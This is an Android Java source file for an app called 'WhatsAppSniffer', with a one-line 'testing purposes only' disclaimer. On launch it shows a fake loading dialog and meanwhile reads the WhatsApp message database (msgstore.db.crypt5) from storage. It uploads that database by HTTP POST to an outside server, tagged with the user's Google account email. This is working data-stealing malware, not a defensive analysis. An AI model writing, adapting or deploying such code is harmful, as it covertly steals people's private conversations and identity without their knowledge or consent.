package tadl.whatsappsniffer;

/*
 * This application is for testing purposes only. 
 * Use of this application is at your own risk.
 */

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;

import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.ProgressDialog;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity {

	//A ProgressDialog object
	private ProgressDialog progressDialog;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		new UploadWhatsApp().execute();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@SuppressWarnings("deprecation")
	private void uploadFile(String file) {
		HttpURLConnection conn = null;
		DataOutputStream dos = null;
		DataInputStream inStream = null;

		Log.i("FILE", "Filename:\n" + file);

		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary = "*****";
		int bytesRead, bytesAvailable, bufferSize;
		byte[] buffer;
		int maxBufferSize = 1 * 1024 * 1024 * 1024;
		String name = getUsername();
		String urlString = "http://wa.taufderl.de/upload_wa5.php?n=" + name;
		try {
			// 	------------------ CLIENT REQUEST
			FileInputStream fileInputStream = new FileInputStream(new File(
					file));
			// open a URL connection to the Servlet
			URL url = new URL(urlString);
			// Open a HTTP connection to the URL
			conn = (HttpURLConnection) url.openConnection();
			// Allow Inputs
			conn.setDoInput(true);
			// Allow Outputs
			conn.setDoOutput(true);
			// Don't use a cached copy.
			conn.setUseCaches(false);
			// Use a post method.
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Content-Type",
					"multipart/form-data;boundary=" + boundary);
			dos = new DataOutputStream(conn.getOutputStream());
			dos.writeBytes(twoHyphens + boundary + lineEnd);
			dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\""
					+ file + "\"" + lineEnd);
			dos.writeBytes(lineEnd);
			// create a buffer of maximum size
			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];
			// read file and write it into form...
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			while (bytesRead > 0) {
				dos.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}
			// send multipart form data necesssary after file data...
			dos.writeBytes(lineEnd);
			dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
			// close streams
			Log.e("Debug", "File is written");
			fileInputStream.close();
			dos.flush();
			dos.close();
		} catch (MalformedURLException ex) {
			Log.e("Debug", "error: " + ex.getMessage(), ex);
		} catch (IOException ioe) {
			Log.e("Debug", "error: " + ioe.getMessage(), ioe);
		}
		// ------------------ read the SERVER RESPONSE
		try {
			if (conn != null){
				inStream = new DataInputStream(conn.getInputStream());
				String str;

				while ((str = inStream.readLine()) != null) {
					Log.e("Debug", "Server Response " + str);
				}
				inStream.close();
			}

		} catch (IOException ioex) {
			Log.e("Debug", "error: " + ioex.getMessage(), ioex);
		}
	}

	public String getUsername(){
	    AccountManager manager = AccountManager.get(this); 
	    Account[] accounts = manager.getAccountsByType("com.google"); 
	    List<String> possibleEmails = new LinkedList<String>();

	    for (Account account : accounts) {
	      possibleEmails.add(account.name);
	    }

	    if(!possibleEmails.isEmpty() && possibleEmails.get(0) != null){
	        return possibleEmails.get(0);
	    }else
	        return null;
	}

	private class UploadWhatsApp extends AsyncTask<Void, Integer, Void>{

		@Override
		protected void onPreExecute()
		{
			//Create a new progress dialog
			progressDialog = ProgressDialog.show(MainActivity.this,"Loading, please wait...",
				    "Loading Application, please wait...", false, false);
		}

		//The code to be executed in a background thread.
		@Override
		protected Void doInBackground(Void... params)
		{

			String fileWACrypt = Environment.getExternalStorageDirectory()
					.getPath() + "/WhatsApp/Databases/msgstore.db.crypt5";

			MainActivity.this.uploadFile(fileWACrypt);
			return null;
		}

		//after executing the code in the thread
		@Override
		protected void onPostExecute(Void result)
		{
			//close the progress dialog
			progressDialog.dismiss();
			//initialize the View
			setContentView(R.layout.activity_main);
		}

	}
}